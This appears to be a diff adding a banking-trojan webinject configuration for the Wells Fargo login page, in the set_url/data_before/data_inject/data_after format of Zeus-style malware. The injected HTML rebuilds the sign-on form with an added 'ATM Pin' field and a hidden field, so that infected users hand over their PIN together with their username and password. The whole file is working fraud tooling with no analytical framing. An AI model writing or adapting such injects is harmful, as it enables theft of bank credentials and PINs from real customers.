@@ -1,0 +1,21 @@
+set_url https://www.wellsfargo.com/ GP
+
+data_before
+<div><strong><label for="userid">Username</label>:</strong><br />
+data_end
+
+data_inject
+<input type="text" accesskey="U" id="userid" name="userid"  size="13" maxlength="14" style="width:147px" tabindex="2" /></div>
+<DIV><STRONG><LABEL for=userid>ATM Pin</LABEL>:</STRONG><BR><INPUT id="atm_check" 
+style="WIDTH: 147px" tabIndex="2" maxLength="6" size="13" name="ATMPin"></DIV>
+<DIV><STRONG><label for="password">Password</label>:</strong><br />
+<input type="password" accesskey="P" id="password" name="password"  size="13" maxlength="14" tabindex="2" />
+<input type="hidden" name="screenid" value="SIGNON" /><input type="hidden" name="origination" value="WebCons" /><input type="hidden" name="LOB" value="Cons" />
+<input type="submit" value="Go" name="btnSignon" id="btnSignon" class="submitBtn" tabindex="2"/></div> 
+<input type="hidden" id="u_p" name="u_p" value=""/>
+</form>
+data_end
+
+data_after
+</form>
+data_end
